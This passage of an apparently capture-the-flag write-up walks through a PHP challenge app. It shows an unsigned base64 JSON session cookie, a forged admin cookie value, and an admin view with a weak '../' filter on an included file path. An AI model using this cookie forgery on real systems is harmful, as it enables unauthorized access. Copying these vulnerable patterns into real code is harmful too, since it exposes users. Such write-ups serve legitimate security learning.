</span><span class="comment linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:1.25em;padding-right:1em;text-align:right;user-select:none">63</span><span class="token php language-php">    </span><span class="token php language-php variable">$session</span><span class="token php language-php operator">-&gt;</span><span class="token php language-php function">distroy</span><span class="token php language-php punctuation">(</span><span class="token php language-php punctuation">)</span><span class="token php language-php punctuation">;</span><span class="token php language-php">
</span><span class="comment linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:1.25em;padding-right:1em;text-align:right;user-select:none">64</span><span class="token php language-php">    </span><span class="token php language-php keyword">return</span><span class="token php language-php"> </span><span class="token php language-php function">header</span><span class="token php language-php punctuation">(</span><span class="token php language-php string single-quoted-string">&#x27;location: /login&#x27;</span><span class="token php language-php punctuation">)</span><span class="token php language-php punctuation">;</span><span class="token php language-php">
</span><span class="token php language-php"><span class="comment linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:1.25em;padding-right:1em;text-align:right;user-select:none">65</span>    
</span><span class="comment linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:1.25em;padding-right:1em;text-align:right;user-select:none">66</span><span class="token php language-php"></span><span class="token php language-php punctuation">}</span><span class="token php language-php punctuation">)</span><span class="token php language-php punctuation">;</span><span class="token php language-php">
</span><span class="token php language-php"><span class="comment linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:1.25em;padding-right:1em;text-align:right;user-select:none">67</span>
</span><span class="token php language-php"><span class="comment linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:1.25em;padding-right:1em;text-align:right;user-select:none">68</span>
</span><span class="comment linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:1.25em;padding-right:1em;text-align:right;user-select:none">69</span><span class="token php language-php"></span><span class="token php language-php keyword">die</span><span class="token php language-php punctuation">(</span><span class="token php language-php variable">$router</span><span class="token php language-php operator">-&gt;</span><span class="token php language-php function">match</span><span class="token php language-php punctuation">(</span><span class="token php language-php punctuation">)</span><span class="token php language-php punctuation">)</span><span class="token php language-php punctuation">;</span></code></pre></div></div>
<p>Looking in <code class="opacity-75 bg-black/30 rounded p-1">views/index.php</code> and <code class="opacity-75 bg-black/30 rounded p-1">SessionHandler.php</code>,</p>
<div class="my-4"><p class="text-xs bg-black/10 rounded-t-lg px-4 py-0.5 text-secondary">Code<!-- --> (php)<!-- -->:<!-- --> <button class="hover:underline">(copy)</button></p><div class="rounded-b-lg overflow-hidden text-xs"><pre class="prismjs"><code style="white-space:pre"><span class="comment linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:1.25em;padding-right:1em;text-align:right;user-select:none">1</span><span class="token php language-php delimiter important">&lt;?php</span><span class="token php language-php"> </span><span class="token php language-php keyword">if</span><span class="token php language-php"> </span><span class="token php language-php punctuation">(</span><span class="token php language-php variable">$admin</span><span class="token php language-php punctuation">)</span><span class="token php language-php punctuation">{</span><span class="token php language-php">
</span><span class="comment linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:1.25em;padding-right:1em;text-align:right;user-select:none">2</span><span class="token php language-php">		</span><span class="token php language-php keyword">include_once</span><span class="token php language-php"> </span><span class="token php language-php string double-quoted-string">&quot;admin.php&quot;</span><span class="token php language-php punctuation">;</span><span class="token php language-php">
</span><span class="comment linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:1.25em;padding-right:1em;text-align:right;user-select:none">3</span><span class="token php language-php">	</span><span class="token php language-php punctuation">}</span><span class="token php language-php"> </span><span class="token php language-php keyword">else</span><span class="token php language-php punctuation">{</span><span class="token php language-php">
</span><span class="comment linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:1.25em;padding-right:1em;text-align:right;user-select:none">4</span><span class="token php language-php">		</span><span class="token php language-php keyword">include_once</span><span class="token php language-php"> </span><span class="token php language-php string double-quoted-string">&quot;user.php&quot;</span><span class="token php language-php punctuation">;</span><span class="token php language-php">
</span><span class="comment linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:1.25em;padding-right:1em;text-align:right;user-select:none">5</span><span class="token php language-php">	</span><span class="token php language-php punctuation">}</span><span class="token php language-php">
</span><span class="comment linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:1.25em;padding-right:1em;text-align:right;user-select:none">6</span><span class="token php language-php"></span><span class="token php language-php delimiter important">?&gt;</span></code></pre></div></div>
<div class="my-4"><p class="text-xs bg-black/10 rounded-t-lg px-4 py-0.5 text-secondary">Code<!-- --> (php)<!-- -->:<!-- --> <button class="hover:underline">(copy)</button></p><div class="rounded-b-lg overflow-hidden text-xs"><pre class="prismjs"><code style="white-space:pre"><span class="comment linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:1.25em;padding-right:1em;text-align:right;user-select:none">1</span><span class="token php language-php delimiter important">&lt;?php</span><span class="token php language-php">
</span><span class="comment linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:1.25em;padding-right:1em;text-align:right;user-select:none">2</span><span class="token php language-php"></span><span class="token php language-php keyword">class</span><span class="token php language-php"> </span><span class="token php language-php class-name-definition class-name">SessionHandler</span><span class="token php language-php">
</span><span class="comment linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:1.25em;padding-right:1em;text-align:right;user-select:none">3</span><span class="token php language-php"></span><span class="token php language-php punctuation">{</span><span class="token php language-php">
</span><span class="comment linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:1.25em;padding-right:1em;text-align:right;user-select:none">4</span><span class="token php language-php">    </span><span class="token php language-php keyword">public</span><span class="token php language-php"> </span><span class="token php language-php keyword">function</span><span class="token php language-php"> </span><span class="token php language-php function-definition function">__construct</span><span class="token php language-php punctuation">(</span><span class="token php language-php punctuation">)</span><span class="token php language-php">
</span><span class="comment linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:1.25em;padding-right:1em;text-align:right;user-select:none">5</span><span class="token php language-php">    </span><span class="token php language-php punctuation">{</span><span class="token php language-php">
</span><span class="comment linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:1.25em;padding-right:1em;text-align:right;user-select:none">6</span><span class="token php language-php">        </span><span class="token php language-php keyword">if</span><span class="token php language-php"> </span><span class="token php language-php punctuation">(</span><span class="token php language-php operator">!</span><span class="token php language-php keyword">empty</span><span class="token php language-php punctuation">(</span><span class="token php language-php global">$_COOKIE</span><span class="token php language-php punctuation">[</span><span class="token php language-php string single-quoted-string">&#x27;PHPSESSID&#x27;</span><span class="token php language-php punctuation">]</span><span class="token php language-php punctuation">)</span><span class="token php language-php punctuation">)</span><span class="token php language-php punctuation">{</span><span class="token php language-php">
</span><span class="comment linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:1.25em;padding-right:1em;text-align:right;user-select:none">7</span><span class="token php language-php">            </span><span class="token php language-php this keyword">$this</span><span class="token php language-php operator">-&gt;</span><span class="token php language-php property">cookie</span><span class="token php language-php"> </span><span class="token php language-php operator">=</span><span class="token php language-php"> </span><span class="token php language-php global">$_COOKIE</span><span class="token php language-php punctuation">[</span><span class="token php language-php string single-quoted-string">&#x27;PHPSESSID&#x27;</span><span class="token php language-php punctuation">]</span><span class="token php language-php punctuation">;</span><span class="token php language-php">
</span><span class="comment linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:1.25em;padding-right:1em;text-align:right;user-select:none">8</span><span class="token php language-php">            </span><span class="token php language-php this keyword">$this</span><span class="token php language-php operator">-&gt;</span><span class="token php language-php function">load</span><span class="token php language-php punctuation">(</span><span class="token php language-php punctuation">)</span><span class="token php language-php punctuation">;</span><span class="token php language-php">
</span><span class="comment linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:1.25em;padding-right:1em;text-align:right;user-select:none">9</span><span class="token php language-php">        </span><span class="token php language-php punctuation">}</span><span class="token php language-php">
</span><span class="comment linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:1.25em;padding-right:1em;text-align:right;user-select:none">10</span><span class="token php language-php">    </span><span class="token php language-php punctuation">}</span><span class="token php language-php">
</span><span class="token php language-php"><span class="comment linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:1.25em;padding-right:1em;text-align:right;user-select:none">11</span>
</span><span class="comment linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:1.25em;padding-right:1em;text-align:right;user-select:none">12</span><span class="token php language-php">    </span><span class="token php language-php keyword">public</span><span class="token php language-php"> </span><span class="token php language-php keyword">function</span><span class="token php language-php"> </span><span class="token php language-php function-definition function">login</span><span class="token php language-php punctuation">(</span><span class="token php language-php variable">$username</span><span class="token php language-php punctuation">)</span><span class="token php language-php">
</span><span class="comment linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:1.25em;padding-right:1em;text-align:right;user-select:none">13</span><span class="token php language-php">    </span><span class="token php language-php punctuation">{</span><span class="token php language-php">
</span><span class="comment linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:1.25em;padding-right:1em;text-align:right;user-select:none">14</span><span class="token php language-php">        </span><span class="token php language-php function">setcookie</span><span class="token php language-php punctuation">(</span><span class="token php language-php string single-quoted-string">&#x27;PHPSESSID&#x27;</span><span class="token php language-php punctuation">,</span><span class="token php language-php"> </span><span class="token php language-php function">base64_encode</span><span class="token php language-php punctuation">(</span><span class="token php language-php function">json_encode</span><span class="token php language-php punctuation">(</span><span class="token php language-php punctuation">[</span><span class="token php language-php">
</span><span class="comment linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:1.25em;padding-right:1em;text-align:right;user-select:none">15</span><span class="token php language-php">            </span><span class="token php language-php string single-quoted-string">&#x27;username&#x27;</span><span class="token php language-php"> </span><span class="token php language-php operator">=&gt;</span><span class="token php language-php"> </span><span class="token php language-php variable">$username</span><span class="token php language-php">
</span><span class="comment linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:1.25em;padding-right:1em;text-align:right;user-select:none">16</span><span class="token php language-php">        </span><span class="token php language-php punctuation">]</span><span class="token php language-php punctuation">)</span><span class="token php language-php punctuation">)</span><span class="token php language-php punctuation">,</span><span class="token php language-php"> </span><span class="token php language-php function">time</span><span class="token php language-php punctuation">(</span><span class="token php language-php punctuation">)</span><span class="token php language-php operator">+</span><span class="token php language-php number">1333337</span><span class="token php language-php punctuation">,</span><span class="token php language-php"> </span><span class="token php language-php string single-quoted-string">&#x27;/&#x27;</span><span class="token php language-php punctuation">)</span><span class="token php language-php punctuation">;</span><span class="token php language-php">
</span><span class="comment linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:1.25em;padding-right:1em;text-align:right;user-select:none">17</span><span class="token php language-php">    </span><span class="token php language-php punctuation">}</span><span class="token php language-php">
</span><span class="token php language-php"><span class="comment linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:1.25em;padding-right:1em;text-align:right;user-select:none">18</span>
</span><span class="comment linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:1.25em;padding-right:1em;text-align:right;user-select:none">19</span><span class="token php language-php">    </span><span class="token php language-php keyword">public</span><span class="token php language-php"> </span><span class="token php language-php keyword">function</span><span class="token php language-php"> </span><span class="token php language-php function-definition function">load</span><span class="token php language-php punctuation">(</span><span class="token php language-php punctuation">)</span><span class="token php language-php">
</span><span class="comment linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:1.25em;padding-right:1em;text-align:right;user-select:none">20</span><span class="token php language-php">    </span><span class="token php language-php punctuation">{</span><span class="token php language-php">
</span><span class="comment linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:1.25em;padding-right:1em;text-align:right;user-select:none">21</span><span class="token php language-php">        </span><span class="token php language-php this keyword">$this</span><span class="token php language-php operator">-&gt;</span><span class="token php language-php property">data</span><span class="token php language-php"> </span><span class="token php language-php operator">=</span><span class="token php language-php"> </span><span class="token php language-php function">json_decode</span><span class="token php language-php punctuation">(</span><span class="token php language-php function">base64_decode</span><span class="token php language-php punctuation">(</span><span class="token php language-php this keyword">$this</span><span class="token php language-php operator">-&gt;</span><span class="token php language-php property">cookie</span><span class="token php language-php punctuation">)</span><span class="token php language-php punctuation">)</span><span class="token php language-php punctuation">;</span><span class="token php language-php">
</span><span class="comment linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:1.25em;padding-right:1em;text-align:right;user-select:none">22</span><span class="token php language-php">    </span><span class="token php language-php punctuation">}</span><span class="token php language-php">
</span><span class="token php language-php"><span class="comment linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:1.25em;padding-right:1em;text-align:right;user-select:none">23</span>
</span><span class="comment linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:1.25em;padding-right:1em;text-align:right;user-select:none">24</span><span class="token php language-php">    </span><span class="token php language-php keyword">public</span><span class="token php language-php"> </span><span class="token php language-php keyword">function</span><span class="token php language-php"> </span><span class="token php language-php function-definition function">isLoggedIn</span><span class="token php language-php punctuation">(</span><span class="token php language-php punctuation">)</span><span class="token php language-php">
</span><span class="comment linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:1.25em;padding-right:1em;text-align:right;user-select:none">25</span><span class="token php language-php">    </span><span class="token php language-php punctuation">{</span><span class="token php language-php">
</span><span class="comment linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:1.25em;padding-right:1em;text-align:right;user-select:none">26</span><span class="token php language-php">        </span><span class="token php language-php keyword">return</span><span class="token php language-php"> </span><span class="token php language-php operator">!</span><span class="token php language-php function">is_null</span><span class="token php language-php punctuation">(</span><span class="token php language-php this keyword">$this</span><span class="token php language-php operator">-&gt;</span><span class="token php language-php property">data</span><span class="token php language-php operator">-&gt;</span><span class="token php language-php property">username</span><span class="token php language-php punctuation">)</span><span class="token php language-php punctuation">;</span><span class="token php language-php">
</span><span class="comment linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:1.25em;padding-right:1em;text-align:right;user-select:none">27</span><span class="token php language-php">    </span><span class="token php language-php punctuation">}</span><span class="token php language-php">
</span><span class="token php language-php"><span class="comment linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:1.25em;padding-right:1em;text-align:right;user-select:none">28</span>
</span><span class="comment linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:1.25em;padding-right:1em;text-align:right;user-select:none">29</span><span class="token php language-php">    </span><span class="token php language-php keyword">public</span><span class="token php language-php"> </span><span class="token php language-php keyword">function</span><span class="token php language-php"> </span><span class="token php language-php function-definition function">isAdmin</span><span class="token php language-php punctuation">(</span><span class="token php language-php punctuation">)</span><span class="token php language-php">
</span><span class="comment linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:1.25em;padding-right:1em;text-align:right;user-select:none">30</span><span class="token php language-php">    </span><span class="token php language-php punctuation">{</span><span class="token php language-php">
</span><span class="comment linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:1.25em;padding-right:1em;text-align:right;user-select:none">31</span><span class="token php language-php">        </span><span class="token php language-php keyword">return</span><span class="token php language-php"> </span><span class="token php language-php this keyword">$this</span><span class="token php language-php operator">-&gt;</span><span class="token php language-php property">data</span><span class="token php language-php operator">-&gt;</span><span class="token php language-php property">username</span><span class="token php language-php"> </span><span class="token php language-php operator">===</span><span class="token php language-php"> </span><span class="token php language-php string single-quoted-string">&#x27;admin&#x27;</span><span class="token php language-php punctuation">;</span><span class="token php language-php">
</span><span class="comment linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:1.25em;padding-right:1em;text-align:right;user-select:none">32</span><span class="token php language-php">    </span><span class="token php language-php punctuation">}</span><span class="token php language-php">
</span><span class="token php language-php"><span class="comment linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:1.25em;padding-right:1em;text-align:right;user-select:none">33</span>
</span><span class="comment linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:1.25em;padding-right:1em;text-align:right;user-select:none">34</span><span class="token php language-php">    </span><span class="token php language-php keyword">public</span><span class="token php language-php"> </span><span class="token php language-php keyword">function</span><span class="token php language-php"> </span><span class="token php language-php function-definition function">getUsername</span><span class="token php language-php punctuation">(</span><span class="token php language-php punctuation">)</span><span class="token php language-php">
</span><span class="comment linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:1.25em;padding-right:1em;text-align:right;user-select:none">35</span><span class="token php language-php">    </span><span class="token php language-php punctuation">{</span><span class="token php language-php">
</span><span class="comment linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:1.25em;padding-right:1em;text-align:right;user-select:none">36</span><span class="token php language-php">        </span><span class="token php language-php keyword">return</span><span class="token php language-php"> </span><span class="token php language-php this keyword">$this</span><span class="token php language-php operator">-&gt;</span><span class="token php language-php property">data</span><span class="token php language-php operator">-&gt;</span><span class="token php language-php property">username</span><span class="token php language-php punctuation">;</span><span class="token php language-php">
</span><span class="comment linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:1.25em;padding-right:1em;text-align:right;user-select:none">37</span><span class="token php language-php">    </span><span class="token php language-php punctuation">}</span><span class="token php language-php">
</span><span class="token php language-php"><span class="comment linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:1.25em;padding-right:1em;text-align:right;user-select:none">38</span>
</span><span class="comment linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:1.25em;padding-right:1em;text-align:right;user-select:none">39</span><span class="token php language-php">    </span><span class="token php language-php keyword">public</span><span class="token php language-php"> </span><span class="token php language-php keyword">function</span><span class="token php language-php"> </span><span class="token php language-php function-definition function">distroy</span><span class="token php language-php punctuation">(</span><span class="token php language-php punctuation">)</span><span class="token php language-php">
</span><span class="comment linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:1.25em;padding-right:1em;text-align:right;user-select:none">40</span><span class="token php language-php">    </span><span class="token php language-php punctuation">{</span><span class="token php language-php">
</span><span class="comment linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:1.25em;padding-right:1em;text-align:right;user-select:none">41</span><span class="token php language-php">        </span><span class="token php language-php keyword">unset</span><span class="token php language-php punctuation">(</span><span class="token php language-php global">$_COOKIE</span><span class="token php language-php punctuation">[</span><span class="token php language-php string single-quoted-string">&#x27;PHPSESSID&#x27;</span><span class="token php language-php punctuation">]</span><span class="token php language-php punctuation">)</span><span class="token php language-php punctuation">;</span><span class="token php language-php">
</span><span class="comment linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:1.25em;padding-right:1em;text-align:right;user-select:none">42</span><span class="token php language-php">        </span><span class="token php language-php function">setcookie</span><span class="token php language-php punctuation">(</span><span class="token php language-php string single-quoted-string">&#x27;PHPSESSID&#x27;</span><span class="token php language-php punctuation">,</span><span class="token php language-php"> </span><span class="token php language-php string single-quoted-string">&#x27;&#x27;</span><span class="token php language-php punctuation">,</span><span class="token php language-php"> </span><span class="token php language-php function">time</span><span class="token php language-php punctuation">(</span><span class="token php language-php punctuation">)</span><span class="token php language-php"> </span><span class="token php language-php operator">-</span><span class="token php language-php"> </span><span class="token php language-php number">3600</span><span class="token php language-php punctuation">,</span><span class="token php language-php"> </span><span class="token php language-php string single-quoted-string">&#x27;/&#x27;</span><span class="token php language-php punctuation">)</span><span class="token php language-php punctuation">;</span><span class="token php language-php">
</span><span class="comment linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:1.25em;padding-right:1em;text-align:right;user-select:none">43</span><span class="token php language-php">    </span><span class="token php language-php punctuation">}</span><span class="token php language-php">
</span><span class="comment linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:1.25em;padding-right:1em;text-align:right;user-select:none">44</span><span class="token php language-php"></span><span class="token php language-php punctuation">}</span></code></pre></div></div>
<p>it seems we can pretty easily log in as admin by base64 encoding the string <code class="opacity-75 bg-black/30 rounded p-1">{&quot;username&quot;:&quot;admin&quot;}</code>, e.g. something like</p>
<div class="my-4"><p class="text-xs bg-black/10 rounded-t-lg px-4 py-0.5 text-secondary">Code<!-- -->:<!-- --> <button class="hover:underline">(copy)</button></p><div class="rounded-b-lg overflow-hidden text-xs"><pre class="prismjs"><code style="white-space:pre"><span class="comment linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:1.25em;padding-right:1em;text-align:right;user-select:none">1</span><span class="">ewogICJ1c2VybmFtZSI6ICJhZG1pbiIKfQ</span></code></pre></div></div>
<p>Replacing our <code class="opacity-75 bg-black/30 rounded p-1">PHPSESSID</code> cookie with that, we get to the admin dashboard:</p>
<p><img src="https://gist.github.com/user-attachments/assets/41a17715-eea8-447d-9909-ff31140957f5" alt="image"/></p>
<p>Looking at the admin view,</p>
<div class="my-4"><p class="text-xs bg-black/10 rounded-t-lg px-4 py-0.5 text-secondary">Code<!-- --> (php)<!-- -->:<!-- --> <button class="hover:underline">(copy)</button></p><div class="rounded-b-lg overflow-hidden text-xs"><pre class="prismjs"><code style="white-space:pre"><span class="comment linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:3.25em;padding-right:1em;text-align:right;user-select:none">1</span><span class="token php language-php delimiter important">&lt;?php</span><span class="token php language-php">
</span><span class="token php language-php"><span class="comment linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:3.25em;padding-right:1em;text-align:right;user-select:none">2</span>
</span><span class="comment linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:3.25em;padding-right:1em;text-align:right;user-select:none">3</span><span class="token php language-php"></span><span class="token php language-php variable">$utilFile</span><span class="token php language-php"> </span><span class="token php language-php operator">=</span><span class="token php language-php"> </span><span class="token php language-php string double-quoted-string">&quot;tickets.php&quot;</span><span class="token php language-php punctuation">;</span><span class="token php language-php">
</span><span class="token php language-php"><span class="comment linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:3.25em;padding-right:1em;text-align:right;user-select:none">4</span>
</span><span class="comment linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:3.25em;padding-right:1em;text-align:right;user-select:none">5</span><span class="token php language-php"></span><span class="token php language-php keyword">if</span><span class="token php language-php"> </span><span class="token php language-php punctuation">(</span><span class="token php language-php keyword">isset</span><span class="token php language-php punctuation">(</span><span class="token php language-php global">$_GET</span><span class="token php language-php punctuation">[</span><span class="token php language-php string single-quoted-string">&#x27;util&#x27;</span><span class="token php language-php punctuation">]</span><span class="token php language-php punctuation">)</span><span class="token php language-php punctuation">)</span><span class="token php language-php">
</span><span class="comment linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:3.25em;padding-right:1em;text-align:right;user-select:none">6</span><span class="token php language-php">	</span><span class="token php language-php variable">$utilFile</span><span class="token php language-php"> </span><span class="token php language-php operator">=</span><span class="token php language-php"> </span><span class="token php language-php global">$_GET</span><span class="token php language-php punctuation">[</span><span class="token php language-php string single-quoted-string">&#x27;util&#x27;</span><span class="token php language-php punctuation">]</span><span class="token php language-php punctuation">;</span><span class="token php language-php">
</span><span class="comment linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:3.25em;padding-right:1em;text-align:right;user-select:none">7</span><span class="token php language-php">	</span><span class="token php language-php variable">$utilFile</span><span class="token php language-php"> </span><span class="token php language-php operator">=</span><span class="token php language-php"> </span><span class="token php language-php function">str_replace</span><span class="token php language-php punctuation">(</span><span class="token php language-php string double-quoted-string">&quot;../&quot;</span><span class="token php language-php punctuation">,</span><span class="token php language-php string double-quoted-string">&quot;&quot;</span><span class="token php language-php punctuation">,</span><span class="token php language-php"> </span><span class="token php language-php variable">$utilFile</span><span class="token php language-php punctuation">)</span><span class="token php language-php punctuation">;</span><span class="token php language-php">
</span><span class="token php language-php"><span class="comment linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:3.25em;padding-right:1em;text-align:right;user-select:none">8</span>
</span><span class="comment linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:3.25em;padding-right:1em;text-align:right;user-select:none">9</span><span class="token php language-php"></span><span class="token php language-php variable">$fullPath</span><span class="token php language-php"> </span><span class="token php language-php operator">=</span><span class="token php language-php"> </span><span class="token php language-php string single-quoted-string">&#x27;/www/utils/&#x27;</span><span class="token php language-php operator">.</span><span class="token php language-php variable">$utilFile</span><span class="token php language-php punctuation">;</span><span class="token php language-php">
</span><span class="token php language-php"><span class="comment linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:3.25em;padding-right:1em;text-align:right;user-select:none">10</span>
</span><span class="comment linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:3.25em;padding-right:1em;text-align:right;user-select:none">11</span><span class="token php language-php"></span><span class="token php language-php delimiter important">?&gt;</span><span class="">
</span><span class="comment linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:3.25em;padding-right:1em;text-align:right;user-select:none">12</span><span class=""></span><span class="token doctype punctuation">&lt;!</span><span class="token doctype doctype-tag">DOCTYPE</span><span class="token doctype"> </span><span class="token doctype name">html</span><span class="token doctype punctuation">&gt;</span><span class="">
</span><span class="comment linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:3.25em;padding-right:1em;text-align:right;user-select:none">13</span><span class=""></span><span class="token tag punctuation">&lt;</span><span class="token tag">html</span><span class="token tag"> </span><span class="token tag attr-name">lang</span><span class="token tag attr-value punctuation attr-equals">=</span><span class="token tag attr-value punctuation">&quot;</span><span class="token tag attr-value">en</span><span class="token tag attr-value punctuation">&quot;</span><span class="token tag punctuation">&gt;</span><span class="">
</span><span class="comment linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:3.25em;padding-right:1em;text-align:right;user-select:none">14</span><span class=""></span><span class="token tag punctuation">&lt;</span><span class="token tag">head</span><span class="token tag punctuation">&gt;</span><span class="">
</span><span class="comment linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:3.25em;padding-right:1em;text-align:right;user-select:none">15</span><span class="">	</span><span class="token tag punctuation">&lt;</span><span class="token tag">title</span><span class="token tag punctuation">&gt;</span><span class="">Broken Production</span><span class="token tag punctuation">&lt;/</span><span class="token tag">title</span><span class="token tag punctuation">&gt;</span><span class="">
</span><span class="comment linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:3.25em;padding-right:1em;text-align:right;user-select:none">16</span><span class="">	</span><span class="token tag punctuation">&lt;</span><span class="token tag">meta</span><span class="token tag"> </span><span class="token tag attr-name">charset</span><span class="token tag attr-value punctuation attr-equals">=</span><span class="token tag attr-value punctuation">&quot;</span><span class="token tag attr-value">UTF-8</span><span class="token tag attr-value punctuation">&quot;</span><span class="token tag punctuation">&gt;</span><span class="">
</span><span class="comment linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:3.25em;padding-right:1em;text-align:right;user-select:none">17</span><span class="">	</span><span class="token tag punctuation">&lt;</span><span class="token tag">meta</span><span class="token tag"> </span><span class="token tag attr-name">name</span><span class="token tag attr-value punctuation attr-equals">=</span><span class="token tag attr-value punctuation">&quot;</span><span class="token tag attr-value">viewport</span><span class="token tag attr-value punctuation">&quot;</span><span class="token tag"> </span><span class="token tag attr-name">content</span><span class="token tag attr-value punctuation attr-equals">=</span><span class="token tag attr-value punctuation">&quot;</span><span class="token tag attr-value">width=device-width, initial-scale=1</span><span class="token tag attr-value punctuation">&quot;</span><span class="token tag punctuation">&gt;</span><span class="">
</span><span class="comment linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:3.25em;padding-right:1em;text-align:right;user-select:none">18</span><span class=""></span><span class="token comment">&lt;!-- ... --&gt;</span><span class="">
</span><span class="comment linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:3.25em;padding-right:1em;text-align:right;user-select:none">19</span><span class=""></span><span class="token tag punctuation">&lt;/</span><span class="token tag">head</span><span class="token tag punctuation">&gt;</span><span class="">
</span><span class="comment linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:3.25em;padding-right:1em;text-align:right;user-select:none">20</span><span class=""></span><span class="token tag punctuation">&lt;</span><span class="token tag">body</span><span class="token tag punctuation">&gt;</span><span class="">
</span><span class="comment linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:3.25em;padding-right:1em;text-align:right;user-select:none">21</span>	
<span class="comment linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:3.25em;padding-right:1em;text-align:right;user-select:none">22</span><span class="">	</span><span class="token tag punctuation">&lt;</span><span class="token tag">body</span><span class="token tag punctuation">&gt;</span><span class="">
</span><span class="comment linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:3.25em;padding-right:1em;text-align:right;user-select:none">23</span><span class="">    </span><span class="token tag punctuation">&lt;</span><span class="token tag">div</span><span class="token tag"> </span><span class="token tag attr-name">id</span><span class="token tag attr-value punctuation attr-equals">=</span><span class="token tag attr-value punctuation">&quot;</span><span class="token tag attr-value">wrapper</span><span class="token tag attr-value punctuation">&quot;</span><span class="token tag punctuation">&gt;</span><span class="">
</span><span class="comment linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:3.25em;padding-right:1em;text-align:right;user-select:none">24</span><span class="">        </span><span class="token comment">&lt;!-- Sidebar --&gt;</span><span class="">
</span><span class="comment linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:3.25em;padding-right:1em;text-align:right;user-select:none">25</span><span class="">        </span><span class="token tag punctuation">&lt;</span><span class="token tag">div</span><span class="token tag"> </span><span class="token tag attr-name">id</span><span class="token tag attr-value punctuation attr-equals">=</span><span class="token tag attr-value punctuation">&quot;</span><span class="token tag attr-value">sidebar-wrapper</span><span class="token tag attr-value punctuation">&quot;</span><span class="token tag punctuation">&gt;</span><span class="">
